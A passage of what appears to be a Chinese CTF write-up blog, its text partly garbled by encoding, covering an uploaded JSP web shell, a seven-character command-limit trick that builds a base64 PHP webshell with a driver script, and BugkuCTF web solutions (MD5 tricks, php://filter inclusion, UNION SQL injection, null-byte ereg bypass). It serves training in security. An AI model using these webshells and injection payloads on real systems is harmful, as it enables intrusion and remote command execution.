<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PUT /kawhi.jsp/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">012</span>c8bc2.yunyansec.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">77.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">77.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">If-Modified-Since: Thu, <span class="number">20</span> Jun <span class="number">2019</span> <span class="number">10</span>:<span class="number">03</span>:<span class="number">08</span> GMT</span><br><span class="line">If-<span class="literal">None</span>-Match: W/<span class="string">&quot;5619-1561024988000&quot;</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Content-Length: <span class="number">666</span></span><br><span class="line"></span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();<span class="keyword">try</span> &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;<span class="keyword">while</span> ((temp = buf.readLine()) != null) &#123;line.append(temp</span><br><span class="line">+<span class="string">&quot;\\n&quot;</span>);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;<span class="keyword">return</span> line.toString();&#125;%&gt;&lt;%<span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>))&amp;&amp;!<span class="string">&quot;&quot;</span>.equals(request.getParameter(<span class="string">&quot;cmd&quot;</span>)))&#123;out.println(<span class="string">&quot;&lt;pre&gt;&quot;</span>+excuteCmd(request.getParameter(<span class="string">&quot;cmd&quot;</span>))+<span class="string">&quot;&lt;/pre&gt;&quot;</span>);&#125;<span class="keyword">else</span>&#123;out.println(<span class="string">&quot;:-)&quot;</span>);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ ¹ç›®å½•</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=ls</span><br></pre></td></tr></table></figure>

<p>å‘ç°flagæ–‡ä»¶</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://012c8bc2.yunyansec.com/kawhi.jsp?&amp;pwd=023&amp;cmd=cat%20flag.txt</span><br></pre></td></tr></table></figure>

<h2 id="åˆ†æä»£ç è·å¾—flag"><a href="#åˆ†æä»£ç è·å¾—flag" class="headerlink" title="åˆ†æä»£ç è·å¾—flag"></a>åˆ†æä»£ç è·å¾—flag</h2><p>é¢˜ç›®ç›´æ¥ç»™æºç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">7</span>)&#123;</span><br><span class="line">     echo shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åŸºç¡€çŸ¥è¯†</strong></p>
<p>è¯¦æƒ…å‚è€ƒï¼š<a style="text-decoration:none;" class="foo" href="https://xz.aliyun.com/t/2748" target="_blank">ä¼ é€é—¨</a> å’Œ <a style="text-decoration:none;" class="foo" href="https://blog.csdn.net/nzjdsds/article/details/102873187" target="_blank">ä¼ é€é—¨</a></p>
<p>è¿™é‡Œçš„è¯æ˜¯é™åˆ¶äº†7ä¸ªå­—ç¬¦</p>
<p>payloadç”¨çš„æ˜¯ä»•å»·å¤§ä½¬wpé‡Œçš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;l\\</span><br><span class="line">&gt;s\ \\</span><br><span class="line">ls&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„æ„æ€æˆ‘è§‰å¾—æ˜¯å…ˆæ„é€ <code>_</code>ï¼Œç„¶ååˆ©ç”¨<code>_</code>å»æ„é€ å‡º<code>ls -t&gt;y</code>ï¼Œç„¶åå†åˆ©ç”¨<code>ls -t&gt;y</code>å»æ„é€ æˆ‘ä»¬çš„webshellã€‚</p>
<p>webshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1.</span>p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">sh _</span><br><span class="line">sh y</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬è®¿é—®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://86568f48.yunyansec.com/?1=&#123;0&#125;&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="string">&quot;[*]&quot;</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line"><span class="comment">#æ£€æŸ¥æ˜¯å¦æ”»å‡»æˆåŠŸ</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://86568f48.yunyansec.com/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥æŸ¥çœ‹ä¿¡æ¯äº†</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=phpinfo();</span><br></pre></td></tr></table></figure>

<p>è¿æ¥èšå‰‘çš„è¯è¦æ„é€ ä¸€ä¸ªpost</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šä¸€çº§çš„keyå¯ä»¥æ‰¾åˆ°flag{a1c8BFF2}</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>BugkuCTF-WEB</title>
    <url>/2020/03/26/BugkuCTF-WEB/</url>
    <content><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h5><p>æœ€è¿‘æŠŠbugkuçš„åŸºç¡€webé¢˜éƒ½åˆ·å®Œäº†ã€‚é‡Œé¢æœ‰å¤§æ¦‚10é“é¢˜éƒ½ä¸èƒ½è®¿é—®ã€‚è¿™é‡Œè®°å½•ä¸€ä¸‹è§£é¢˜çš„è¿‡ç¨‹ã€‚</p>
<h5 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a><strong>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</strong></h5><p>é¢˜ç›®æç¤ºï¼šå¬è¯´å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ã€‚</p>
<p>äºæ˜¯è¯•ç€åŠ å…¥åç¼€<strong>index.php.bak</strong>ï¼Œç„¶åçœ‹åˆ°æç¤ºä¸‹è½½ã€‚ç„¶åæ‰“å¼€ä¸‹è½½çš„å¤‡ä»½æ–‡ä»¶çœ‹åˆ°ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200322105903654.png" alt="image-20200322105903654" style="high:80%;width:80%;" />

<p>å°±æ˜¯è¦ä¼ å…¥çš„ä¸¤ä¸ªå€¼çš„md5ç›¸ç­‰ï¼Œä½†æ˜¯ä¸¤ä¸ªå€¼ä¸ç›¸ç­‰ã€‚</p>
<p><strong>è§£å†³æ–¹å¼ä¸€ï¼š</strong>md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥æ•°ç»„ä¼šè¿”å›NULLã€‚æ„é€ url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kkeyey1[]=1&amp;kkeyey2[]=2</span><br></pre></td></tr></table></figure>

<p><strong>è§£å†³æ–¹å¼äºŒï¼š</strong>å¦‚æœå­—ç¬¦ç»è¿‡md5åŠ å¯†åçš„å€¼ä¸º0exxçš„å½¢å¼ï¼Œä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤º0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ã€‚æ„é€ url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure>

<h5 id="å˜é‡1"><a href="#å˜é‡1" class="headerlink" title="å˜é‡1"></a><strong>å˜é‡1</strong></h5><p>æ‰“å¼€ç½‘é¡µçœ‹åˆ°</p>
<img src="http://img.kawhi.xyz/image-20200322104141287.png" alt="image-20200322104141287" style="high:80%;width:80%;" />

<p>é¢˜ç›®å·²ç»é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼å¯¹$argsè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†æ˜¯è¿™é‡Œå¯ä»¥ä½¿ç”¨è¶…å…¨å±€å˜é‡$GLOBALSã€‚</p>
<p>å› ä¸ºPHPåœ¨$GLOBALS[index]æ•°ç»„ä¸­å‚¨å­˜äº†æ‰€æœ‰å…¨å±€å˜é‡ï¼Œå˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</p>
<p>æ„é€ url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure>

<h5 id="flagåœ¨indexé‡Œ"><a href="#flagåœ¨indexé‡Œ" class="headerlink" title="flagåœ¨indexé‡Œ"></a><strong>flagåœ¨indexé‡Œ</strong></h5><p>æ‰“å¼€é¡µé¢å¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200320140041305.png" alt="image-20200320140041305" style="high:80%;width:80%;" />

<p>çœ‹åˆ°fileçŸ¥é“åº”è¯¥æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•ä¸‹æ‰‹ï¼Œçœ‹wpä¹‹åçŸ¥é“å¯ä»¥ç”¨PHPå†…ç½®åè®®php://filter</p>
<p>æ„é€ url:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°é€šè¿‡base64åŠ å¯†åçš„æºç å·²ç»çˆ†å‡º,è§£å¯†,å¾—åˆ°flagã€‚</p>
<h5 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a><strong>æˆç»©å•</strong></h5><p>æ‰“å¼€ç½‘é¡µå¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200322144603485.png" alt="image-20200322144603485" style="high:80%;width:80%;" />

<p>ä¸€å¼€å§‹æˆ‘å°±è§‰å¾—æ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰åšå‡ºæ¥ï¼Œç„¶åçœ‹äº†wpè§‰å¾—å¥½ç®€å•ã€‚</p>
<p>æŸ¥æ•°æ®åº“</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,database()--</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥è¡¨å</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,table_name from information_schema.tables where table_schema=&#x27;</span>skctf_flag<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥å­—æ®µå</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,column_name from information_schema.columns where table_name=&#x27;</span>fl4g<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure>

<p>æŸ¥å†…å®¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select 1,2,3,skctf_flag from fl4g--</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<h5 id="ç§‹åå±±è€å¸æœº"><a href="#ç§‹åå±±è€å¸æœº" class="headerlink" title="ç§‹åå±±è€å¸æœº"></a><strong>ç§‹åå±±è€å¸æœº</strong></h5><p>æ‰“å¼€ç½‘é¡µçœ‹åˆ°å¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200322165647628.png" alt="image-20200322165647628" style="high:80%;width:80%;" />

<p>æœ¬é¢˜è¦æ±‚è®¡ç®—å“åº”å†…å®¹ä¸­çš„è¡¨è¾¾å¼å¹¶ç”¨ POST è¯·æ±‚è¿”å›ç»“æœï¼Œä½†æ˜¯å¿…é¡»åœ¨ä¸¤ç§’ä¹‹å†…å®Œæˆã€‚æ‰€ä»¥é æ‰‹å·¥çš„æ–¹æ³•æ˜¯åšä¸åˆ°çš„ã€‚è¿™é‡Œå¯ä»¥åˆ©ç”¨pythoné‡Œé¢çš„requestå†™ä¸€ä¸ªè„šæœ¬ã€‚è¯¦æƒ…å¯å‚è€ƒï¼š<a style="text-decoration:none;" class="foo" target="_blank" href="https://ciphersaw.me/2017/12/16/è¯¦è§£ CTF Web ä¸­çš„å¿«é€Ÿåå¼¹ POST è¯·æ±‚/">ä¼ é€é—¨</a></p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200322201254499.png" alt="image-20200322201254499" style="high:80%;width:80%;" />

<p>è¿™é‡Œçš„ä¼šè¯å¯¹è±¡ Session() èƒ½å¤Ÿåœ¨å¤šæ¬¡è¯·æ±‚ä¸­ä¿æŒå‚æ•°ï¼Œç„¶åæ˜¯å¼•å…¥ re æ¨¡å—ï¼Œå…¶æ¬¡ç”¨ search() æ­£åˆ™åŒ¹é…ç®—æœ¯è¡¨è¾¾å¼ï¼ŒåŒ¹é…æˆåŠŸåç”¨ group() è¿”å›ç®—æœ¯è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²ã€‚è·å¾—ç®—æœ¯è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²åï¼Œç›´æ¥åˆ©ç”¨ Python çš„å…§å»ºæ–¹æ³• <a href="https://docs.python.org/3/library/functions.html#eval">eval()</a> æ¥è®¡ç®—å‡ºç»“æœã€‚ç„¶åè¿è¡Œè„šæœ¬å°±å¯å¾—åˆ°flagã€‚</p>
<h5 id="é€Ÿåº¦è¦å¿«"><a href="#é€Ÿåº¦è¦å¿«" class="headerlink" title="é€Ÿåº¦è¦å¿«"></a><strong>é€Ÿåº¦è¦å¿«</strong></h5><p>æ‰“å¼€ç½‘é¡µå¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200322212200486.png" alt="image-20200322212200486" style="high:80%;width:80%;" />

<p>ç„¶åæŸ¥çœ‹å“åº”å¤´å’Œç½‘é¡µçš„æºä»£ç å‘ç°ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200322212837581.png" alt="image-20200322212837581" style="high:80%;width:80%;" />

<p>åº”è¯¥æ˜¯è¦æäº¤ä»¥marginä¸ºkeyï¼Œflagé‡Œçš„å€¼ä¸ºvalueç„¶åä»¥postçš„æ–¹å¼æäº¤æ•°æ®ã€‚ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ‰‹åŠ¨æäº¤æ²¡æˆåŠŸï¼ŒæŸ¥çœ‹wpå‘ç°å’Œç§‹åå±±è€å¸æœºé‚£ä¸€é¢˜æ˜¯å·®ä¸å¤šçš„ã€‚ä»–çš„flagæ˜¯ä¸æ–­åœ¨å˜çš„ã€‚æ‰€ä»¥éœ€è¦å†™ä¸€ä¸ªè„šæœ¬æ¥å¾—åˆ°flagã€‚</p>
<img src="http://img.kawhi.xyz/image-20200322213958769.png" alt="image-20200322213958769" style="high:80%;width:80%;" />

<h5 id="cookieæ¬ºéª—"><a href="#cookieæ¬ºéª—" class="headerlink" title="cookieæ¬ºéª—"></a><strong>cookieæ¬ºéª—</strong></h5><p>æ‰“å¼€ç½‘é¡µå‘ç°ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200323114059871.png" alt="image-20200323114059871" style="high:80%;width:80%;" />

<p>è¿™é‡ŒæŠŠfilenameåé¢çš„å­—ç¬¦ä¸²base64è§£ç åå‘ç°æ˜¯keys.txtã€‚ç„¶åè¯•ç€æŠŠindex.phpä¼ ä¸Šå»ï¼Œè¿™é‡Œéœ€è¦base64ç¼–ç åå†ä¸Šä¼ ã€‚ç„¶ålineçš„å€¼è¾“å…¥æ•°å­—ä¹‹åå‘ç°å‡ºç°ä¸€è¡Œä¸€è¡Œçš„ä»£ç ï¼Œè¿™é‡Œå¯ä»¥å†™ä¸ªè„šæœ¬æŠŠæ‰€æœ‰çš„ä»£ç æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200323115824785.png" alt="image-20200323115824785" style="high:80%;width:80%;" />

<p>åˆ†ææºç ï¼Œå‰é¢åˆ¤æ–­ä¼ å‚ï¼Œåé¢åˆ¤æ–­cookieå¿…é¡»æ»¡è¶³margin=marginæ‰èƒ½è®¿é—®keys.phpã€‚</p>
<img src="http://img.kawhi.xyz/image-20200323120059198.png" alt="image-20200323120059198" style="high:80%;width:80%;" />

<h5 id="Never-give-up"><a href="#Never-give-up" class="headerlink" title="Never give up"></a><strong>Never give up</strong></h5><p>æ‰“å¼€ç½‘é¡µå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<img src="http://img.kawhi.xyz/image-20200323212638319.png" alt="image-20200323212638319" style="high:80%;width:80%;" />

<p>å‘ç°æºä»£ç é‡Œé¢æœ‰ä¸€ä¸ª1p.htmlï¼Œä½†æ˜¯ç›´æ¥è®¿é—®è¿™ä¸ªçš„è¯æ˜¯ä¼šè·³è½¬åˆ°å®˜ç½‘é‡Œé¢ã€‚æ‰€ä»¥ä½¿ç”¨burp suiteæŠ“åŒ…ï¼Œç„¶åç»è¿‡ä¸€ç³»åˆ—çš„ç¼–ç åå‘ç°ä¸€æ®µphpçš„ä»£ç ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200324095112996.png" alt="image-20200324095112996" style="high:80%;width:80%;" />

<p>è¿™é‡Œå…¶å®ç›´æ¥æ‰“å¼€<a href="http://123.206.87.240:8006/test/f4l2a3g.txt%E5%8D%B3%E5%8F%AF%E8%8E%B7%E5%BE%97flag%E4%BA%86%E3%80%82%E4%BD%86%E6%98%AF%E7%9C%8Bwp%E4%B9%8B%E5%90%8E%E6%9C%89%E4%BA%BA%E8%AF%B4%E5%8F%AF%E8%83%BD%E6%98%AF%E5%87%BA%E9%A2%98%E4%BA%BA%E7%9A%84%E5%A4%B1%E8%AF%AF%E3%80%82%E6%89%80%E4%BB%A5%E8%BF%98%E6%9C%89%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E8%A7%A3%E6%B3%95%E3%80%82">http://123.206.87.240:8006/test/f4l2a3g.txtå³å¯è·å¾—flagäº†ã€‚ä½†æ˜¯çœ‹wpä¹‹åæœ‰äººè¯´å¯èƒ½æ˜¯å‡ºé¢˜äººçš„å¤±è¯¯ã€‚æ‰€ä»¥è¿˜æœ‰å¦å¤–ä¸€ç§è§£æ³•ã€‚</a></p>
<p>ç¬¬1è¡Œï¼šé™åˆ¶ URL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­å¿…é¡»æœ‰éç©ºéé›¶å˜é‡<font color=#DC143C>id</font></p>
<p>è¿™é‡Œå¼±ç±»å‹æ¯”è¾ƒçš„æ—¶å€™ï¼Œå­—ç¬¦ä¸²æ˜¯ç­‰äº0çš„ã€‚</p>
<p>å¼±ç±»å‹æ¯”è¾ƒè¯¦æƒ…ï¼š<a style="text-decoration:none;" class="foo" target="_blank" href="https://www.php.net/manual/zh/types.comparisons.php">ä¼ é€é—¨</a></p>
<p>ç¬¬9è¡Œï¼šé™åˆ¶å˜é‡<font color=#DC143C>$a</font>ä¸­ä¸èƒ½å«æœ‰å­—ç¬¦<code>.</code></p>
<p>ç¬¬15è¡Œï¼šè¦æ»¡è¶³ä»¥ä¸‹ 5 æ¡è¡¨è¾¾å¼æ‰ä¼šçˆ† flagï¼š</p>
<ul>
<li>å˜é‡<font color=#DC143C>$data</font>å¼±ç­‰äºå­—ç¬¦ä¸²<font color=#DC143C>bugku is a nice plateform!</font>ã€‚</li>
</ul>
<p>è¿™é‡Œçš„å˜é‡<code>$data</code>æ˜¯ç”±<code>file_get_contents()</code>å‡½æ•°è¯»å–çš„ï¼Œæ‰€ä»¥ç›´æ¥ç»™aèµ‹å€¼æ˜¯ä¸è¡Œçš„ï¼Œè¿™é‡Œè¦ç”¨ä¼ªåè®®  <code>php://</code>  æ¥è®¿é—®è¾“å…¥è¾“å‡ºçš„æ•°æ®æµã€‚å…¶ä¸­<code>php://input</code> å¯ä»¥è®¿é—®åŸå§‹è¯·æ±‚æ•°æ®ä¸­çš„åªè¯»æµã€‚è¿™é‡Œä»¤ <code>$a = &quot;php://input&quot;</code>ï¼Œå¹¶åœ¨è¯·æ±‚ä¸»ä½“ä¸­æäº¤å­—ç¬¦ä¸² <code>bugku is a nice plateform!</code>ã€‚</p>
<p>æœ‰å…³ PHP ä¼ªåè®®çš„è¯¦æƒ…ï¼š<a style="text-decoration:none;" class="foo" target="_blank" href="https://www.php.net/manual/zh/wrappers.php">ä¼ é€é—¨</a></p>
<ul>
<li>å˜é‡<font color=#DC143C>$id</font>å¼±ç­‰äºæ•´å‹æ•°0</li>
<li>å˜é‡<font color=#DC143C>$b</font>çš„é•¿åº¦å¤§äº5</li>
<li>å­—ç¬¦ä¸²<font color=#DC143C>1114</font> è¦ä¸å­—ç¬¦ä¸² <font color=#DC143C>111</font> è¿æ¥å˜é‡ <font color=#DC143C>$b</font> çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ„æˆçš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚</li>
</ul>
<p><code>ereg()</code> å‡½æ•°æˆ– <code>eregi()</code> å‡½æ•°å­˜åœ¨ç©ºå­—ç¬¦æˆªæ–­æ¼æ´ï¼Œå³å‚æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼æˆ–å¾…åŒ¹é…å­—ç¬¦ä¸²é‡åˆ°ç©ºå­—ç¬¦åˆ™æˆªæ–­ä¸¢å¼ƒåé¢çš„æ•°æ®ã€‚</p>
<p>æºç ä¸­å¾…åŒ¹é…å­—ç¬¦ä¸²ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰å·²ç¡®å®šä¸º <code>&quot;1114&quot;</code>ï¼Œæ­£åˆ™è¡¨è¾¾å¼ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ç”± <code>&quot;111&quot;</code> è¿æ¥ <code>$b</code> çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç»„æˆï¼Œè‹¥ä»¤ <code>substr($b,0,1) = &quot;\x00&quot;</code>ï¼Œå³æ»¡è¶³ <code>&quot;1114&quot;</code> ä¸ <code>&quot;111&quot;</code> åŒ¹é…ã€‚å› æ­¤ï¼Œè¿™é‡Œå‡è®¾ <code>$b = &quot;\x0012345&quot;</code>ï¼Œæ‰èƒ½æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªæ¡ä»¶ã€‚</p>
<ul>
<li>å˜é‡ <font color=#DC143C>$b</font> çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼±ä¸ç­‰äºæ•´å‹æ•° <font color=#DC143C>4</font></li>
</ul>
<p>æ„é€ payloadåçˆ†å‡ºflag</p>
<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯åœ¨æ„é€ å˜é‡ <code>b</code> ä¸­çš„ç©ºå­—ç¬¦æ—¶ï¼Œè¿‡æ—©å°†ç©ºå­—ç¬¦ <code>\x00</code> æ”¾å…¥ï¼Œåœ¨æäº¤è¯·æ±‚æ—¶å¯¼è‡´è¯·æ±‚å¤´æˆªæ–­ï¼Œç»§è€Œè¯·æ±‚å¤±è´¥ï¼Œå¾—ä¸åˆ°å“åº”ã€‚å› ä¸º <code>b</code> æ˜¯ URL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­çš„å˜é‡ï¼Œä¸åº”è¯¥åœ¨æ­¤æ”¾å…¥ç©ºå­—ç¬¦ <code>\x00</code>ï¼Œè€Œåº”è¯¥ä¸ºç©ºå­—ç¬¦çš„ URL ç¼–ç  <code>%00</code>ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200324155132388.png" alt="image-20200324155132388" style="high:80%;width:80%;" />

<h5 id="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"><a href="#å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ" class="headerlink" title="å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ"></a><strong>å­—ç¬¦ï¼Ÿæ­£åˆ™ï¼Ÿ</strong></h5><img src="http://img.kawhi.xyz/image-20200325174427232.png" alt="image-20200325174427232" style="high:80%;width:80%;" />

<p>é¢˜ç›®å¦‚ä¸Šï¼šå¯ä»¥çœ‹å‡ºåªè¦æˆ‘ä»¬æ„é€ å‡ºç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²é€šè¿‡GETä¼ å‚å°±å¯ä»¥çœ‹åˆ°flagã€‚æ‰€ä»¥é¦–å…ˆè¦åˆ†æè¿™ä¸ªæ­£åˆ™ã€‚</p>
<p><strong>å®šç•Œç¬¦ï¼š</strong>/å’Œ/ ä¸€èˆ¬æ¥è¯´æ˜¯è¿™ä¸¤ä¸ªã€‚</p>
<p><strong>. ï¼ˆä¸€ä¸ªç‚¹ï¼‰ï¼š</strong>è¡¨ç¤ºå¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦ã€‚</p>
<p><strong>{n,m} ï¼š</strong>å‰é¢çš„å­—ç¬¦é‡å¤4~7æ¬¡ã€‚</p>
<p><strong>\ ï¼ˆåæ–œçº¿ï¼‰ï¼š</strong>åé¢çš„å­—ç¬¦è¢«è½¬ä¹‰ã€‚</p>
<p><strong>[a-z] ï¼š</strong>åœ¨aåˆ°zä¸­åŒ¹é…ã€‚</p>
<p><strong>[[:punct:]] ï¼š</strong>åŒ¹é…ä»»ä½•æ ‡ç‚¹ç¬¦å·ã€‚</p>
<p><strong>/i ï¼š</strong>è¡¨ç¤ºè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯¹å¤§å°å†™ä¸æ•æ„Ÿã€‚</p>
<p>è¿™é‡Œæˆ‘æ„é€ çš„payloadä¸ºï¼škey1key11111key:/1/1keya&gt;</p>
<p>é€šè¿‡getä¼ å‚å³å¯å¾—åˆ°flagã€‚</p>
<h5 id="web8"><a href="#web8" class="headerlink" title="web8"></a><strong>web8</strong></h5><p>é¢˜ç›®å¦‚ä¸‹ï¼š</p>
<img src="http://img.kawhi.xyz/image-20200325183547450.png" alt="image-20200325183547450" style="high:80%;width:80%;" />

<p>é¦–å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ªé¢˜ç›®ï¼š</p>
<p>acå˜é‡ä¸ä¸ºç©ºï¼Œfnè¦ç”¨php://inputè¯»å–ï¼Œå’Œå‰é¢çš„é¢˜ç›®æœ‰ä¸€äº›ç±»ä¼¼</p>
